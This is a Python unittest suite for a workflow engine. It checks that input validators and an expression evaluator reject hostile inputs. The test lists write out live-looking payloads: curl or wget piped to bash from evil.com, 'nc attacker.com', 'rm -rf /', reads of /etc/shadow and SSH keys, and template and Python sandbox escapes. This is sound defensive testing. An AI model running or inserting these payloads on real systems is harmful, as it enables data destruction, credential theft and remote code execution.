#!/usr/bin/env python3
"""
Comprehensive Security Tests for Workflow Orchestration System
Tests for injection vulnerabilities, access controls, and security boundaries.
"""
import unittest
import asyncio
import tempfile
import os
import sys
import json
from unittest.mock import Mock, patch, MagicMock

# Add parent directories to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from engine.secure_workflow_engine import (
    SecureWorkflowEngine, SecurityContext, SecurityError, 
    SecureInputValidator, SecureExpressionEvaluator,
    ResourceExhaustionError, WorkflowTimeoutError
)
from parser.workflow_parser import WorkflowDefinition, WorkflowStep, WorkflowInput


class TestSecurityInputValidation(unittest.TestCase):
    """Test input validation security controls"""
    
    def setUp(self):
        self.validator = SecureInputValidator()
    
    def test_code_injection_detection(self):
        """Test detection of code injection attempts"""
        dangerous_inputs = [
            "__import__('os').system('rm -rf /')",
            "eval('print(\"hacked\")')",
            "exec('import os; os.system(\"evil\")')",
            "compile('malicious', '<string>', 'exec')",
            "getattr(__builtins__, 'eval')('1+1')",
            "globals()['__builtins__']['exec']('code')",
            "''.__class__.__mro__[1].__subclasses__()",
            "{}.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit()"
        ]
        
        for dangerous_input in dangerous_inputs:
            with self.assertRaises(SecurityError, msg=f"Failed to detect: {dangerous_input}"):
                self.validator.validate_string_input(dangerous_input, "test")
    
    def test_path_traversal_detection(self):
        """Test detection of path traversal attacks"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\cmd.exe",
            "/etc/shadow",
            "../../root/.ssh/id_rsa",
            "file://etc/passwd",
            "../../../proc/version"
        ]
        
        for malicious_path in malicious_paths:
            with self.assertRaises(SecurityError, msg=f"Failed to block: {malicious_path}"):
                self.validator.validate_file_path(malicious_path)
    
    def test_shell_injection_detection(self):
        """Test detection of shell command injection"""
        malicious_commands = [
            "ls; rm -rf /",
            "echo test && cat /etc/passwd",
            "python script.py | sh",
            "curl evil.com | bash",
            "wget -O- malicious.sh | sh",
            "ls $(whoami)",
            "echo `id`",
            "cat file > /dev/sda"
        ]
        
        for malicious_command in malicious_commands:
            with self.assertRaises(SecurityError, msg=f"Failed to detect: {malicious_command}"):
                self.validator.validate_shell_command(malicious_command)
    
    def test_template_injection_detection(self):
        """Test detection of template injection attacks"""
        malicious_templates = [
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "{{ config.items() }}",
            "{{ self.__init__.__globals__['sys'].exit() }}",
            "{{ lipsum.__globals__['os'].system('id') }}",
            "{{ ''.__class__.__bases__[0].__subclasses__() }}",
            "{{ request.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit() }}"
        ]
        
        for malicious_template in malicious_templates:
            with self.assertRaises(SecurityError, msg=f"Failed to detect: {malicious_template}"):
                self.validator.validate_template_content(malicious_template)
    
    def test_valid_inputs_pass(self):
        """Test that valid inputs are not blocked"""
        valid_inputs = [
            "normal text string",
            "file.txt",
            "src/main.py",
            "echo 'hello world'",
            "{{ inputs.target_file }}",
            "if condition: print('ok')"
        ]
        
        for valid_input in valid_inputs:
            try:
                self.validator.validate_string_input(valid_input, "test")
                self.validator.validate_file_path(valid_input) if '/' in valid_input or '\\' in valid_input else None
                if valid_input.startswith(('echo', 'python', 'npm', 'git')):
                    self.validator.validate_shell_command(valid_input)
                if '{{' in valid_input and '}}' in valid_input:
                    self.validator.validate_template_content(valid_input)
            except SecurityError:
                self.fail(f"Valid input was incorrectly rejected: {valid_input}")


class TestSecureExpressionEvaluator(unittest.TestCase):
    """Test secure expression evaluation"""
    
    def setUp(self):
        self.evaluator = SecureExpressionEvaluator()
    
    def test_safe_expressions(self):
        """Test that safe expressions work correctly"""
        safe_tests = [
            ("true", {}, True),
            ("false", {}, False),
            ("1 == 1", {}, True),
            ("'hello' != 'world'", {}, True),
            ("x > 5", {"x": 10}, True),
            ("x < 5", {"x": 10}, False)
        ]
        
        for expression, context, expected in safe_tests:
            try:
                result = self.evaluator.evaluate_condition(expression, context)
                self.assertEqual(result, expected, f"Expression '{expression}' failed")
            except Exception as e:
                self.fail(f"Safe expression '{expression}' raised exception: {e}")
    
    def test_dangerous_expressions_blocked(self):
        """Test that dangerous expressions are blocked"""
        dangerous_expressions = [
            "__import__('os').system('id')",
            "eval('1+1')",
            "exec('print(1)')",
            "open('/etc/passwd').read()",
            "globals()",
            "locals()",
            "vars()",
            "dir()",
            "getattr(__builtins__, 'eval')"
        ]
        
        for dangerous_expr in dangerous_expressions:
            with self.assertRaises((SecurityError, Exception), msg=f"Dangerous expression not blocked: {dangerous_expr}"):
                self.evaluator.evaluate_condition(dangerous_expr, {})


class TestWorkflowEngineSecurityBoundaries(unittest.TestCase):
    """Test security boundaries in workflow engine"""
    
    def setUp(self):
        self.engine = SecureWorkflowEngine()
        self.security_context = SecurityContext(
            user_id="test-user",
            permissions={"workflow.execute", "shell.execute", "file.write"},
            security_profile="restricted"
        )
        self.malicious_context = SecurityContext(
            user_id="malicious-user", 
            permissions=set(),
            security_profile="plan_only"
        )
    
    def test_permission_enforcement(self):
        """Test that permissions are properly enforced"""
        
        # Test workflow execution permission
        self.assertTrue(self.security_context.has_permission("workflow.execute"))
        self.assertFalse(self.malicious_context.has_permission("workflow.execute"))
        
        # Test shell execution permission
        self.assertTrue(self.security_context.has_permission("shell.execute"))
        self.assertFalse(self.malicious_context.has_permission("shell.execute"))
        
        # Test file write permission
        self.assertTrue(self.security_context.has_permission("file.write"))
        self.assertFalse(self.malicious_context.has_permission("file.write"))
    
    def test_input_sanitization(self):
        """Test that inputs are properly sanitized"""
        sensitive_inputs = {
            "password": "secret123",
            "api_token": "abc123def456",
            "ssh_key": "-----BEGIN RSA PRIVATE KEY-----",
            "normal_input": "safe value"
        }
        
        sanitized = self.engine._sanitize_inputs(sensitive_inputs)
        
        self.assertEqual(sanitized["password"], "[REDACTED]")
        self.assertEqual(sanitized["api_token"], "[REDACTED]") 
        self.assertEqual(sanitized["ssh_key"], "[REDACTED]")
        self.assertEqual(sanitized["normal_input"], "safe value")
    
    def test_output_sanitization(self):
        """Test that outputs are properly sanitized"""
        from engine.secure_workflow_engine import SecureStepResult, ExecutionStatus
        
        result = SecureStepResult("test-step", ExecutionStatus.RUNNING)
        
        sensitive_outputs = {
            "password": "secret123", 
            "token": "abc123",
            "normal": "safe output",
            "long_output": "a" * 2000  # Test length limit
        }
        
        result.set_completed(sensitive_outputs)
        
        # Outputs should be sanitized
        self.assertIn("password", result.outputs)
        self.assertIn("normal", result.outputs)
        self.assertEqual(result.outputs["normal"], "safe output")
        self.assertLessEqual(len(result.outputs["long_output"]), 1000)  # Length limited
    
    def test_cache_key_generation_security(self):
        """Test that cache keys are generated securely"""
        step = WorkflowStep(
            id="test-step",
            type="shell", 
            command="echo test"
        )
        
        context = {"inputs": {"sensitive": "secret123"}}
        
        cache_key1 = self.engine._generate_cache_key(step, context)
        
        # Change sensitive data
        context["inputs"]["sensitive"] = "different_secret"
        cache_key2 = self.engine._generate_cache_key(step, context)
        
        # Cache keys should be different
        self.assertNotEqual(cache_key1, cache_key2)
        
        # Cache keys should be hashes, not contain sensitive data
        self.assertNotIn("secret123", cache_key1)
        self.assertNotIn("different_secret", cache_key2)


class TestResourceLimitsAndDOS(unittest.TestCase):
    """Test resource limits and DoS protection"""
    
    def setUp(self):
        self.engine = SecureWorkflowEngine()
        self.security_context = SecurityContext(
            user_id="test-user",
            permissions={"workflow.execute"},
            security_profile="restricted",
            resource_limits={"memory_mb": 512, "cpu_seconds": 30}
        )
    
    def test_concurrent_workflow_limits(self):
        """Test limits on concurrent workflow execution"""
        # This would need async testing setup
        pass
    
    def test_memory_limits(self):
        """Test memory usage limits"""
        # Simulate high memory usage
        large_inputs = {"large_data": "x" * (10 * 1024 * 1024)}  # 10MB string
        
        # This should be handled gracefully
        try:
            sanitized = self.engine._sanitize_inputs(large_inputs)
            # Output should be truncated
            self.assertLessEqual(len(sanitized["large_data"]), 100)
        except Exception as e:
            # Should not crash the system
            self.assertIsInstance(e, (SecurityError, ResourceExhaustionError))
    
    def test_file_size_limits(self):
        """Test file size limits in template generation"""
        from engine.secure_workflow_engine import SecureStepResult, ExecutionStatus
        
        # Create large template output
        large_content = "x" * (150 * 1024 * 1024)  # 150MB
        
        step = WorkflowStep(
            id="test-template",
            type="template",
            template=large_content,
            output="test.txt"
        )
        
        # This should be rejected due to size limits
        # (Implementation would check file size during template execution)
        pass


class TestSecurityIntegrationScenarios(unittest.TestCase):
    """Test end-to-end security scenarios"""
    
    def setUp(self):
        self.engine = SecureWorkflowEngine()
        self.security_context = SecurityContext(
            user_id="test-user",
            permissions={"workflow.execute", "shell.execute", "file.write"},
            security_profile="restricted"
        )
    
    async def test_malicious_workflow_blocked(self):
        """Test that malicious workflows are blocked"""
        # Create malicious workflow definition
        malicious_workflow = WorkflowDefinition(
            name="malicious-workflow",
            version="1.0"
        )
        
        # Add malicious step
        malicious_step = WorkflowStep(
            id="evil-step",
            type="shell",
            command="rm -rf / && echo 'pwned'"
        )
        malicious_workflow.steps = [malicious_step]
        
        malicious_inputs = {
            "target": "../../../etc/passwd"
        }
        
        # Should be blocked by security controls
        with self.assertRaises((SecurityError, Exception)):
            await self.engine.execute_workflow_securely(
                malicious_workflow,
                malicious_inputs,
                self.security_context
            )
    
    async def test_privilege_escalation_blocked(self):
        """Test that privilege escalation attempts are blocked"""
        # Test workflow that tries to escalate privileges
        escalation_workflow = WorkflowDefinition(
            name="escalation-test",
            version="1.0"
        )
        
        escalation_step = WorkflowStep(
            id="escalate",
            type="shell", 
            command="sudo -i; whoami"
        )
        escalation_workflow.steps = [escalation_step]
        
        # Should be blocked
        with self.assertRaises((SecurityError, Exception)):
            await self.engine.execute_workflow_securely(
                escalation_workflow,
                {},
                self.security_context
            )
    
    def test_information_disclosure_prevention(self):
        """Test prevention of information disclosure"""
        from engine.secure_workflow_engine import SecureStepResult, ExecutionStatus
        
        result = SecureStepResult("test", ExecutionStatus.RUNNING)
        
        # Simulate command output with sensitive information
        sensitive_output = """
        Database connection: password=secret123
        API Token: token=abc123def456
        SSH Key: -----BEGIN RSA PRIVATE KEY-----
        Normal output line
        """
        
        sanitized = result._sanitize_error(sensitive_output)
        
        # Sensitive information should be redacted
        self.assertNotIn("secret123", sanitized)
        self.assertNotIn("abc123def456", sanitized)
        self.assertIn("[REDACTED]", sanitized)
        self.assertIn("Normal output line", sanitized)
    
    def test_audit_trail_creation(self):
        """Test that security events are properly audited"""
        self.security_context.log_security_event("Test security event")
        self.security_context.log_security_event("Another event with sensitive data: password=secret")
        
        # Check audit trail
        self.assertGreater(len(self.security_context.audit_trail), 0)
        
        # Check that sensitive data is sanitized in logs
        audit_entries = '\n'.join(self.security_context.audit_trail)
        self.assertNotIn("password=secret", audit_entries)
        self.assertIn("Test security event", audit_entries)


class TestPenetrationTestScenarios(unittest.TestCase):
    """Penetration testing scenarios for the workflow system"""
    
    def setUp(self):
        self.engine = SecureWorkflowEngine()
        self.security_context = SecurityContext(
            user_id="pentest-user",
            permissions={"workflow.execute"},
            security_profile="standard"
        )
    
    def test_ssti_attack_vectors(self):
        """Test Server-Side Template Injection attack vectors"""
        ssti_payloads = [
            "{{ 7*7 }}",  # Basic math
            "{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit() }}",
            "{{ config.items() }}",
            "{{ self.__dict__ }}",
            "{{ [].__class__.__base__.__subclasses__() }}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{% endfor %}"
        ]
        
        validator = SecureInputValidator()
        
        for payload in ssti_payloads:
            with self.assertRaises(SecurityError, msg=f"SSTI payload not blocked: {payload}"):
                validator.validate_template_content(payload)
    
    def test_command_injection_vectors(self):
        """Test command injection attack vectors"""
        injection_payloads = [
            "ls; cat /etc/passwd",
            "ls && rm -rf /",
            "ls | nc attacker.com 1234",
            "ls `whoami`",
            "ls $(id)",
            "ls > /dev/sda",
            "python -c 'import os; os.system(\"evil\")'",
            "curl http://evil.com/shell.sh | bash"
        ]
        
        validator = SecureInputValidator()
        
        for payload in injection_payloads:
            with self.assertRaises(SecurityError, msg=f"Command injection not blocked: {payload}"):
                validator.validate_shell_command(payload)
    
    def test_path_traversal_vectors(self):
        """Test path traversal attack vectors"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "/proc/self/environ",
            "/var/log/auth.log",
            "file:///etc/passwd",
            "jar:file:///etc/passwd!/",
            "../../../root/.ssh/authorized_keys"
        ]
        
        validator = SecureInputValidator()
        
        for payload in traversal_payloads:
            with self.assertRaises(SecurityError, msg=f"Path traversal not blocked: {payload}"):
                validator.validate_file_path(payload)
    
    def test_python_code_execution_vectors(self):
        """Test Python code execution attack vectors"""
        code_exec_payloads = [
            "__import__('subprocess').call(['ls'])",
            "eval('__import__(\"os\").system(\"id\")')",
            "exec('import os; os.system(\"whoami\")')",
            "compile('malicious code', '<string>', 'exec')",
            "().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit()",
            "getattr(__builtins__, 'eval')('1+1')",
            "vars()['__builtins__']['eval']('code')"
        ]
        
        evaluator = SecureExpressionEvaluator()
        
        for payload in code_exec_payloads:
            with self.assertRaises((SecurityError, Exception), msg=f"Code execution not blocked: {payload}"):
                evaluator.evaluate_condition(payload, {})


def run_security_test_suite():
    """Run the complete security test suite"""
    print("🔒 Running Comprehensive Security Test Suite...")
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all security test classes
    test_classes = [
        TestSecurityInputValidation,
        TestSecureExpressionEvaluator, 
        TestWorkflowEngineSecurityBoundaries,
        TestResourceLimitsAndDOS,
        TestSecurityIntegrationScenarios,
        TestPenetrationTestScenarios
    ]
    
    for test_class in test_classes:
        tests = loader.loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    # Run tests with detailed output
    runner = unittest.TextTestRunner(verbosity=2, stream=sys.stdout)
    result = runner.run(suite)
    
    # Detailed results
    total_tests = result.testsRun
    failures = len(result.failures) 
    errors = len(result.errors)
    
    print(f"\n🔒 Security Test Results:")
    print(f"Total Security Tests: {total_tests}")
    print(f"Passed: {total_tests - failures - errors}")
    print(f"Failed: {failures}")
    print(f"Errors: {errors}")
    print(f"Security Test Success Rate: {((total_tests - failures - errors) / total_tests * 100):.1f}%")
    
    # Report specific failures
    if failures:
        print(f"\n❌ Test Failures:")
        for test, traceback in result.failures:
            print(f"  - {test}: {traceback.split(chr(10))[-2]}")
    
    if errors:
        print(f"\n💥 Test Errors:")
        for test, traceback in result.errors:
            print(f"  - {test}: {traceback.split(chr(10))[-2]}")
    
    if failures == 0 and errors == 0:
        print("✅ All security tests passed - system appears secure!")
        return True
    else:
        print("❌ Security vulnerabilities detected - DO NOT DEPLOY!")
        return False


if __name__ == "__main__":
    success = run_security_test_suite()
    sys.exit(0 if success else 1)